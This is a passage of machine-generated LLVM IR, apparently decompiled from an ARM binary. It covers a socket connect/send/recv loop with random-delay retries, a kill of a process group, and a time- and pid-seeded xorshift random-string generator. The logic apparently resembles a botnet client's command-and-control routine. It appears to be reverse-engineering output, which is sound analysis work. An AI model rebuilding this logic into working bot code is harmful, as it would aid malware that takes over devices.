  %v2_1094c = load i32, i32* @global_var_1cca8.163, align 4
  store i32 %v2_1094c, i32* %r3.global-to-local, align 4
  %v2_10950 = icmp eq i32 %v2_1094c, 0
  br i1 %v2_10950, label %.thread, label %bb92

bb92:                                             ; preds = %dec_label_pc_1092c
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_13c54.210 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1092c, %bb92
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10964 = load i32, i32* @global_var_1cca4.205, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1ccfc.208 to i8*), align 4
  %v4_10974 = call i32 @_connect(i32 %v2_10964, i32 ptrtoint (i8** @global_var_1cd54.170 to i32), i32 16)
  br label %dec_label_pc_10674

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10704
  %v2_10984 = load i32, i32* @global_var_1cca4.205, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_10994 = call i32 @send(i32 %v2_10984, i32* nonnull %v5_10994, i32 2, i32 16384)
  br label %dec_label_pc_1072c

dec_label_pc_1099c:                               ; preds = %dec_label_pc_10774
  store i32 4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 %v2_109ac, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v8_109c4 = call i32 @getsockopt(i32 %v2_107fc, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-52)
  %v3_109c8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_109c8, i32* %r3.global-to-local, align 4
  %v2_109cc = icmp eq i32 %v3_109c8, 0
  br i1 %v2_109cc, label %dec_label_pc_10a3c, label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_1099c
  %v2_109d4 = load i32, i32* @global_var_1cca4.205, align 4
  %v1_109d8 = call i32 @close(i32 %v2_109d4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_109e0 = load i32, i32* @r5, align 4
  %v2_109e0 = inttoptr i32 %v1_109e0 to i32*
  store i32 -1, i32* %v2_109e0, align 4
  %v0_109e4 = call i32 @function_10b68()
  %v2_109ec = urem i32 %v0_109e4, 10
  %v1_109f0 = add nuw nsw i32 %v2_109ec, 1
  %v1_109f4 = call i32 @sleep(i32 %v1_109f0)
  br label %dec_label_pc_105fc.backedge

dec_label_pc_109fc:                               ; preds = %dec_label_pc_1073c
  %v1_10a2c = sub i32 0, %v1_105b8
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_109ac, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v8_10a14 = call i32 @accept(i32 %v2_10730, %sockaddr* %tmp90, i32* nonnull %stack_var_-48)
  %v1_10a18 = call i32 @function_11398(i32 %v8_10a14)
  %v1_10a1c = call i32 @function_f288(i32 %v1_10a18)
  %v1_10a20 = call i32 @function_b084(i32 %v1_10a1c)
  store i32 %v1_105b8, i32* %r2.global-to-local, align 4
  %v2_10a30 = call i32 @kill(i32 %v1_10a2c, i32 9)
  call void @exit(i32 0)
  unreachable

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_1099c
  %v2_10a40 = call i32 @function_1399c(i8* %v1_10a40)
  %v3_10a40 = trunc i32 %v2_10a40 to i8
  store i8 %v3_10a40, i8* %stack_var_-38, align 1
  %v0_10a48 = call i32 @function_13c54()
  %v0_10a4c = load i32, i32* @r4, align 4
  store i32 %v0_10a4c, i32* %r2.global-to-local, align 4
  %v1_10a50 = load i32, i32* @fp, align 4
  %v2_10a50 = inttoptr i32 %v1_10a50 to i32*
  store i32 %v0_10a48, i32* %v2_10a50, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10a5c = load i32, i32* @r5, align 4
  %v1_10a5c = inttoptr i32 %v0_10a5c to i32*
  %v2_10a5c = load i32, i32* %v1_10a5c, align 4
  %v5_10a60 = call i32 @send(i32 %v2_10a5c, i32* nonnull @global_var_14378.212, i32 %v0_10a4c, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_10a6c = load i32, i32* @r5, align 4
  %v1_10a6c = inttoptr i32 %v0_10a6c to i32*
  %v2_10a6c = load i32, i32* %v1_10a6c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10a78 = call i32 @send(i32 %v2_10a6c, i32* %v5_10994, i32 1, i32 16384)
  %v3_10a7c = load i8, i8* %stack_var_-38, align 1
  %v4_10a7c = sext i8 %v3_10a7c to i32
  store i32 %v4_10a7c, i32* %r2.global-to-local, align 4
  %v2_10a80 = icmp eq i8 %v3_10a7c, 0
  br i1 %v2_10a80, label %dec_label_pc_105fc.backedge, label %dec_label_pc_10a88

dec_label_pc_10a88:                               ; preds = %dec_label_pc_10a3c
  %v0_10a88 = load i32, i32* @r5, align 4
  %v1_10a88 = inttoptr i32 %v0_10a88 to i32*
  %v2_10a88 = load i32, i32* %v1_10a88, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10a94 = call i32 @send(i32 %v2_10a88, i32* nonnull %stack_var_-138, i32 %v4_10a7c, i32 16384)
  br label %dec_label_pc_105fc.backedge

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_108ac, %dec_label_pc_10834
  %stack_var_-37.3 = phi i8 [ %stack_var_-37.1, %dec_label_pc_10834 ], [ %v1_10890, %dec_label_pc_108ac ]
  %v0_10a9c = load i32, i32* @r8, align 4
  %v1_10a9c = inttoptr i32 %v0_10a9c to i32*
  %v2_10a9c = load i32, i32* %v1_10a9c, align 4
  store i32 %v2_10a9c, i32* %r3.global-to-local, align 4
  %v7_10aa0 = icmp eq i32 %v2_10a9c, 4
  br i1 %v7_10aa0, label %dec_label_pc_105fc.backedge, label %bb93

bb93:                                             ; preds = %dec_label_pc_10a9c
  %v8_10aa4 = icmp eq i32 %v2_10a9c, 11
  br i1 %v8_10aa4, label %dec_label_pc_105fc.backedge, label %dec_label_pc_108e8

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_1086c
  %v2_10ab4 = load i32, i32* @global_var_1cca4.205, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10ac4 = call i32 @_recv(i32 %v2_10ab4, i32 %v2_10988, i32 2, i32 16384)
  br label %dec_label_pc_105fc.backedge

dec_label_pc_10acc:                               ; preds = %dec_label_pc_108e0
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10adc = load i32, i32* @global_var_1cca4.205, align 4
  %v4_10ae0 = call i32 @_recv(i32 %v2_10adc, i32 %v2_10988, i32 2, i32 16384)
  %v3_10ae4 = load i8, i8* %stack_var_-38, align 1
  %v4_10ae4 = sext i8 %v3_10ae4 to i32
  %v4_10aec = mul nsw i32 %v4_10ae4, 256
  %v5_10aec = or i32 %v4_10aec, %v4_108b0
  store i32 %v5_10aec, i32* %r2.global-to-local, align 4
  store i32 %v4_10ae4, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10b00 = load i32, i32* @global_var_1cca4.205, align 4
  store i8 %v1_10890, i8* %stack_var_-38, align 1
  %v7_10b0c = call i32 @_recv(i32 %v2_10b00, i32 %v2_108bc, i32 %v5_10aec, i32 16384)
  %v3_10b10 = load i8, i8* %stack_var_-38, align 1
  %v4_10b10 = sext i8 %v3_10b10 to i32
  store i32 %v4_10b10, i32* %r2.global-to-local, align 4
  %v4_10b14 = zext i8 %v3_10ae4 to i32
  store i32 %v4_10b14, i32* %r3.global-to-local, align 4
  %v4_10b18 = mul nuw nsw i32 %v4_10b14, 256
  %v5_10b18 = or i32 %v4_10b10, %v4_10b18
  %v7_10b18 = icmp eq i32 %v5_10b18, 0
  br i1 %v7_10b18, label %dec_label_pc_105fc.backedge, label %dec_label_pc_10b20

dec_label_pc_10b20:                               ; preds = %dec_label_pc_10acc
  %v5_10b24 = call i32 @function_ae30(i32* nonnull %stack_var_-1616, i32 %v5_10b18, i32 %v4_10b10, i32 %v4_10b14)
  br label %dec_label_pc_105fc.backedge

; uselistorder directives
  uselistorder i32 %v4_10b14, { 1, 0, 2 }
  uselistorder i32 %v4_10b10, { 1, 0, 2 }
  uselistorder i32 %v4_10ae4, { 1, 0 }
  uselistorder i8 %v3_10ae4, { 2, 3, 1, 0 }
  uselistorder i8 %stack_var_-37.3, { 1, 0, 2 }
  uselistorder i32 %v3_10918, { 1, 3, 2, 0 }
  uselistorder i32 %v4_108d4, { 1, 0 }
  uselistorder i32 %v4_108b0, { 1, 0 }
  uselistorder i8 %v1_10890, { 0, 2, 1 }
  uselistorder i32 %v3_108885, { 0, 2, 1 }
  uselistorder i32 %v4_10884, { 1, 0 }
  uselistorder i32 %v4_10858, { 1, 0 }
  uselistorder i32 %v2_107fc, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_10730, { 3, 2, 1, 0 }
  uselistorder i8 %stack_var_-37.1, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %v13_106ec, { 2, 1, 0 }
  uselistorder i32 %v2_10630, { 2, 1, 0 }
  uselistorder i32 %v1_10620, { 1, 2, 0 }
  uselistorder i32 %v1_10608, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1620.0, { 0, 3, 1, 2 }
  uselistorder i32 %v2_10988, { 2, 1, 0 }
  uselistorder i32 %v4_10560, { 1, 2, 0 }
  uselistorder i32 %v2_104a8, { 0, 10, 1, 11, 2, 3, 9, 4, 5, 8, 6, 12, 7 }
  uselistorder i32 %v1_103f4, { 1, 0 }
  uselistorder i32 %v1_103c4, { 1, 0 }
  uselistorder i32 %v0_103b8, { 1, 0 }
  uselistorder i32 %v1_10390, { 1, 0 }
  uselistorder i32 %v0_10384, { 1, 0 }
  uselistorder i32 %v1_1035c, { 1, 0 }
  uselistorder i32 %v0_10350, { 1, 0 }
  uselistorder i32 %v1_10328, { 1, 0 }
  uselistorder i32 %v0_10318, { 1, 0 }
  uselistorder i32 %v0_10314, { 1, 0 }
  uselistorder i32 %v0_102f4, { 1, 0 }
  uselistorder i32 %v4_101d0, { 1, 2, 0 }
  uselistorder i32 %v2_10178, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-36, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 0, 4, 6, 5, 7 }
  uselistorder i8* %stack_var_-106, { 2, 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-138, { 1, 2, 0, 3 }
  uselistorder i8* %stack_var_-38, { 10, 9, 8, 7, 6, 0, 5, 4, 3, 1, 2 }
  uselistorder i8 %tmp38, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 4, 3, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 57, 58, 41, 42, 38, 55, 56, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i8 1, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* @global_var_1cca8.163, { 1, 0 }
  uselistorder i32 16386, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* bitcast (i8** @global_var_1ccfc.208 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1ccfc.208, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ccfc.208 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1cca0.165, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_1cca4.205, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 (i32, i32*, i32)* @write, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_139c4, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 (i32, i32)* @function_10c1c, { 2, 1, 0 }
  uselistorder i32 ()* @function_ff68, { 1, 0 }
  uselistorder i8** @global_var_1cd54.170, { 1, 0 }
  uselistorder [2 x i8]* @global_var_14300.78, { 1, 0 }
  uselistorder i32 (i8*, i32, ...)* @open, { 6, 3, 2, 1, 0, 5, 4, 7 }
  uselistorder void (i32)** @global_var_ff50.175, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_108ac, { 1, 0 }
  uselistorder label %dec_label_pc_105fc.backedge, { 5, 11, 4, 10, 12, 3, 9, 2, 1, 8, 7, 0, 6 }
  uselistorder label %dec_label_pc_1072c, { 2, 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_10674, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10664, { 1, 0 }
  uselistorder label %dec_label_pc_1061c.dec_label_pc_1061c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10604.dec_label_pc_10604_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10480, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1045c, { 2, 0, 1 }
}

define i32 @function_10b68() local_unnamed_addr {
dec_label_pc_10b68:
  %v2_10b74 = load i32, i32* @global_var_1cd00.214, align 4
  %v2_10b78 = load i32, i32* @global_var_1cd0c.216, align 4
  store i32 ptrtoint (i32* @global_var_1cd04.218 to i32), i32* @lr, align 4
  %v4_10b84 = mul i32 %v2_10b74, 2048
  %v5_10b84 = xor i32 %v4_10b84, %v2_10b74
  %v4_10b88 = udiv i32 %v2_10b78, 524288
  %v5_10b88 = xor i32 %v4_10b88, %v2_10b78
  %v2_10b8c = load i32, i32* @global_var_1cd04.218, align 4
  %v2_10b90 = load i32, i32* @global_var_1cd08.220, align 4
  %v2_10b94 = xor i32 %v5_10b88, %v5_10b84
  %v4_10b98 = udiv i32 %v5_10b84, 256
  %v5_10b98 = xor i32 %v2_10b94, %v4_10b98
  store i32 %v2_10b8c, i32* @global_var_1cd00.214, align 4
  store i32 %v2_10b90, i32* @global_var_1cd04.218, align 4
  store i32 %v2_10b78, i32* @global_var_1cd08.220, align 4
  store i32 %v5_10b98, i32* @global_var_1cd0c.216, align 4
  ret i32 %v5_10b98

; uselistorder directives
  uselistorder i32 %v2_10b78, { 2, 1, 0 }
  uselistorder i32 %v2_10b74, { 1, 0 }
}

define i32 @function_10bc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10bc0:
  %stack_var_-12 = alloca i32, align 4
  %v3_10bc0 = load i32, i32* @r4, align 4
  store i32 %v3_10bc0, i32* %stack_var_-12, align 4
  %v2_10bc8 = call i32 @time(i32* null)
  store i32 %v2_10bc8, i32* @global_var_1cd00.214, align 4
  %v0_10bd4 = call i32 @getpid()
  %v0_10bdc = call i32 @getppid()
  %v2_10be4 = xor i32 %v0_10bd4, %v0_10bdc
  store i32 %v2_10be4, i32* @global_var_1cd04.218, align 4
  %v1_10bec = call i32 @clock()
  %v2_10bf0 = load i32, i32* @global_var_1cd04.218, align 4
  %v2_10bfc = xor i32 %v2_10bf0, %v1_10bec
  store i32 %v2_10bfc, i32* @global_var_1cd0c.216, align 4
  store i32 %v1_10bec, i32* @global_var_1cd08.220, align 4
  %v2_10c08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10c08, i32* @r4, align 4
  ret i32 %v1_10bec

; uselistorder directives
  uselistorder i32 %v1_10bec, { 1, 2, 0 }
  uselistorder i32 ()* @getpid, { 2, 1, 3, 4, 0 }
}

define i32 @function_10c1c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c1c:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10c1c = load i32, i32* @r4, align 4
  store i32 %v3_10c1c, i32* %stack_var_-36, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_143b8.226 to i32), i32* %r1.global-to-local, align 4
  %v2_10c30 = ptrtoint i32* %stack_var_-69 to i32
  store i32 %v2_10c30, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r2.global-to-local, align 4
  %v5_10c38 = call i32* @memcpy(i32* nonnull %stack_var_-69, i32* bitcast ([33 x i8]* @global_var_143b8.226 to i32*), i32 33)
  %v7_10c38 = ptrtoint i32* %v5_10c38 to i32
  store i32 %v7_10c38, i32* %r0.global-to-local, align 4
  %v0_10c3c = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10c3c = icmp slt i32 %v0_10c3c, 0
  store i1 %v1_10c3c, i1* %cpsr_n.global-to-local, align 1
  %v2_10c3c = icmp eq i32 %v0_10c3c, 0
  store i1 %v2_10c3c, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_10c3c, 1
  br i1 %tmp20, label %dec_label_pc_10d28, label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c1c
  store i32 ptrtoint (i32* @global_var_1cd0c.216 to i32), i32* %fp.global-to-local, align 4
  %v2_10c50 = load i32, i32* @global_var_1cd08.220, align 4
  store i32 %v2_10c50, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd00.214 to i32), i32* %r3.global-to-local, align 4
  %v2_10c58 = load i32, i32* @global_var_1cd04.218, align 4
  store i32 %v2_10c58, i32* %sl.global-to-local, align 4
  %v2_10c5c = load i32, i32* @global_var_1cd0c.216, align 4
  store i32 %v2_10c5c, i32* %r6.global-to-local, align 4
  %v2_10c60 = load i32, i32* @global_var_1cd00.214, align 4
  store i32 %v2_10c60, i32* %ip.global-to-local, align 4
  %v0_10c64 = load i32, i32* %r4.global-to-local, align 4
  %v1_10c64 = add i32 %v0_10c64, 1
  store i32 %v1_10c64, i32* %r7.global-to-local, align 4
  %v2_10c70 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_10cd0

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10cd0
  %v1_10c6c = udiv i32 %v5_10cdc, 8
  %v4_10c74 = urem i32 %v1_10c6c, 32
  %v5_10c74 = add i32 %v4_10c74, %v2_10c70
  store i32 %v5_10c74, i32* %r0.global-to-local, align 4
  %v3_10c78 = mul i32 %v5_10cdc, 65536
  store i32 %v3_10c78, i32* %r2.global-to-local, align 4
  store i32 %v2_10c70, i32* %r3.global-to-local, align 4
  %v3_10c80 = mul i32 %v5_10cdc, 256
  store i32 %v3_10c80, i32* %r1.global-to-local, align 4
  %tmp21 = udiv i32 %v5_10cdc, 2048
  %v4_10c84 = urem i32 %tmp21, 32
  %v5_10c84 = add i32 %v4_10c84, %v2_10c70
  store i32 %v5_10c84, i32* %ip.global-to-local, align 4
  %tmp22 = udiv i32 %v5_10cdc, 524288
  %v4_10c88 = urem i32 %tmp22, 32
  %v5_10c88 = add i32 %v4_10c88, %v2_10c70
  %v4_10c8c = udiv i32 %v2_10cd8, 134217728
  %v5_10c8c = add i32 %v4_10c8c, %v2_10c70
  store i32 %v5_10c8c, i32* %r4.global-to-local, align 4
  %v1_10c90 = add i32 %v5_10c84, -33
  %v2_10c90 = inttoptr i32 %v1_10c90 to i8*
  %v3_10c90 = load i8, i8* %v2_10c90, align 1
  %v4_10c90 = zext i8 %v3_10c90 to i32
  store i32 %v4_10c90, i32* %r2.global-to-local, align 4
  %v1_10c94 = add i32 %v5_10c74, -33
  %v2_10c94 = inttoptr i32 %v1_10c94 to i8*
  %v3_10c94 = load i8, i8* %v2_10c94, align 1
  %v4_10c94 = zext i8 %v3_10c94 to i32
  store i32 %v4_10c94, i32* %r3.global-to-local, align 4
  %v1_10c98 = add i32 %v5_10c88, -33
  %v2_10c98 = inttoptr i32 %v1_10c98 to i8*
  %v3_10c98 = load i8, i8* %v2_10c98, align 1
  %v4_10c98 = zext i8 %v3_10c98 to i32
  store i32 %v4_10c98, i32* %r1.global-to-local, align 4
  %v1_10c9c = add i32 %v5_10c8c, -33
  %v2_10c9c = inttoptr i32 %v1_10c9c to i8*
  %v3_10c9c = load i8, i8* %v2_10c9c, align 1
  %v4_10c9c = zext i8 %v3_10c9c to i32
  store i32 %v4_10c9c, i32* %r0.global-to-local, align 4
  %v1_10ca0 = add i32 %v0_10ca0, -4
  store i32 %v1_10ca0, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10ca4 = icmp slt i32 %v1_10ca0, 0
  store i1 %v1_10ca4, i1* %cpsr_n.global-to-local, align 1
  %v2_10ca4 = icmp eq i32 %v1_10ca0, 0
  store i1 %v2_10ca4, i1* %cpsr_z.global-to-local, align 1
  %v3_10ca8 = add i32 %v2_10ca8, -1
  %v4_10ca8 = inttoptr i32 %v3_10ca8 to i8*
  store i8 %v3_10c94, i8* %v4_10ca8, align 1
  %v0_10cac = load i32, i32* %r2.global-to-local, align 4
  %v1_10cac = trunc i32 %v0_10cac to i8
  %v2_10cac = load i32, i32* %r7.global-to-local, align 4
  %v3_10cac = inttoptr i32 %v2_10cac to i8*
  store i8 %v1_10cac, i8* %v3_10cac, align 1
  %v0_10cb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_10cb0 = trunc i32 %v0_10cb0 to i8
  %v2_10cb0 = load i32, i32* %r7.global-to-local, align 4
  %v3_10cb0 = add i32 %v2_10cb0, 1
  %v4_10cb0 = inttoptr i32 %v3_10cb0 to i8*
  store i8 %v1_10cb0, i8* %v4_10cb0, align 1
  %v0_10cb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10cb4 = trunc i32 %v0_10cb4 to i8
  %v2_10cb4 = load i32, i32* %r7.global-to-local, align 4
  %v3_10cb4 = add i32 %v2_10cb4, 2
  %v4_10cb4 = inttoptr i32 %v3_10cb4 to i8*
  store i8 %v1_10cb4, i8* %v4_10cb4, align 1
  %v0_10cb8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10cb8, i32* %ip.global-to-local, align 4
  %v0_10cbc = load i32, i32* %r7.global-to-local, align 4
  %v1_10cbc = add i32 %v0_10cbc, 4
  store i32 %v1_10cbc, i32* %r7.global-to-local, align 4
  %v0_10cc0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10cc0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10cc0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10cc0 = xor i1 %v1_10cc0, %v2_10cc0
  %v4_10cc0 = or i1 %v0_10cc0, %v3_10cc0
  br i1 %v4_10cc0, label %dec_label_pc_10d0c, label %dec_label_pc_10cc4

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10cf0, %dec_label_pc_10c6c
  %v2_10cfc6 = phi i32 [ %v1_10d04, %dec_label_pc_10cf0 ], [ %v1_10cbc, %dec_label_pc_10c6c ]
  %v0_10cd02 = phi i32 [ %v0_10d00, %dec_label_pc_10cf0 ], [ %v0_10cb8, %dec_label_pc_10c6c ]
  %v0_10cc4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_10cc4, i32* %sl.global-to-local, align 4
  %v0_10cc8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10cc8, i32* %sb.global-to-local, align 4
  %v0_10ccc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10ccc, i32* %r6.global-to-local, align 4
  %v0_10ce0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10c44, %dec_label_pc_10cc4
  %v2_10ca8 = phi i32 [ %v1_10c64, %dec_label_pc_10c44 ], [ %v2_10cfc6, %dec_label_pc_10cc4 ]
  %v0_10ca0 = phi i32 [ %v0_10c3c, %dec_label_pc_10c44 ], [ %v0_10ce0.pre, %dec_label_pc_10cc4 ]
  %v0_10cd4 = phi i32 [ %v2_10c5c, %dec_label_pc_10c44 ], [ %v0_10ccc, %dec_label_pc_10cc4 ]
  %v0_10cd0 = phi i32 [ %v2_10c60, %dec_label_pc_10c44 ], [ %v0_10cd02, %dec_label_pc_10cc4 ]
  %v4_10cd0 = mul i32 %v0_10cd0, 2048
  %v5_10cd0 = xor i32 %v4_10cd0, %v0_10cd0
  store i32 %v5_10cd0, i32* %r3.global-to-local, align 4
  %v4_10cd4 = udiv i32 %v0_10cd4, 524288
  %v5_10cd4 = xor i32 %v4_10cd4, %v0_10cd4
  %v2_10cd8 = xor i32 %v5_10cd4, %v5_10cd0
  store i32 %v2_10cd8, i32* %r2.global-to-local, align 4
  %v4_10cdc = udiv i32 %v5_10cd0, 256
  %v5_10cdc = xor i32 %v4_10cdc, %v2_10cd8
  store i32 %v5_10cdc, i32* %r5.global-to-local, align 4
  %v1_10ce0 = add i32 %v0_10ca0, -3
  %v2_10ce0 = icmp ugt i32 %v0_10ca0, 2
  %v3_10ce0 = sub i32 2, %v0_10ca0
  %v4_10ce0 = and i32 %v3_10ce0, %v0_10ca0
  %v5_10ce0 = icmp slt i32 %v4_10ce0, 0
  store i1 %v5_10ce0, i1* %cpsr_v.global-to-local, align 1
  %v6_10ce0 = icmp slt i32 %v1_10ce0, 0
  store i1 %v6_10ce0, i1* %cpsr_n.global-to-local, align 1
  %v7_10ce0 = icmp eq i32 %v0_10ca0, 3
  store i1 %v7_10ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_10cdc, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r1.global-to-local, align 4
  %v2_10cec = xor i1 %v7_10ce0, true
  %v3_10cec = and i1 %v2_10ce0, %v2_10cec
  br i1 %v3_10cec, label %dec_label_pc_10c6c, label %dec_label_pc_10cf0

dec_label_pc_10cf0:                               ; preds = %dec_label_pc_10cd0
  %v2_10cf0 = urem i32 %v5_10cdc, 33
  store i32 %v2_10cf0, i32* %r0.global-to-local, align 4
  %v1_10cf4 = add i32 %v0_10ca0, -1
  store i32 %v1_10cf4, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10cf8 = icmp slt i32 %v1_10cf4, 0
  store i1 %v1_10cf8, i1* %cpsr_n.global-to-local, align 1
  %v2_10cf8 = icmp eq i32 %v1_10cf4, 0
  store i1 %v2_10cf8, i1* %cpsr_z.global-to-local, align 1
  %v1_10cfc = trunc i32 %v2_10cf0 to i8
  %v3_10cfc = add i32 %v2_10ca8, -1
  %v4_10cfc = inttoptr i32 %v3_10cfc to i8*
  store i8 %v1_10cfc, i8* %v4_10cfc, align 1
  %v0_10d00 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10d00, i32* %ip.global-to-local, align 4
  %v0_10d04 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d04 = add i32 %v0_10d04, 1
  store i32 %v1_10d04, i32* %r7.global-to-local, align 4
  %v0_10d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d08 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10d08 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10d08 = xor i1 %v1_10d08, %v2_10d08
  %v4_10d08 = or i1 %v0_10d08, %v3_10d08
  br i1 %v4_10d08, label %dec_label_pc_10d0c, label %dec_label_pc_10cc4

dec_label_pc_10d0c:                               ; preds = %dec_label_pc_10cf0, %dec_label_pc_10c6c
  store i32 ptrtoint (i32* @global_var_1cd04.218 to i32), i32* %r3.global-to-local, align 4
  %v0_10d14 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10d14, i32* @global_var_1cd08.220, align 4
  store i32 ptrtoint (i32* @global_var_1cd00.214 to i32), i32* %ip.global-to-local, align 4
  %v0_10d1c = load i32, i32* %r5.global-to-local, align 4
  %v1_10d1c = load i32, i32* %fp.global-to-local, align 4
  %v2_10d1c = inttoptr i32 %v1_10d1c to i32*
  store i32 %v0_10d1c, i32* %v2_10d1c, align 4
  %v0_10d20 = load i32, i32* %sb.global-to-local, align 4
  %v1_10d20 = load i32, i32* %r3.global-to-local, align 4
  %v2_10d20 = inttoptr i32 %v1_10d20 to i32*
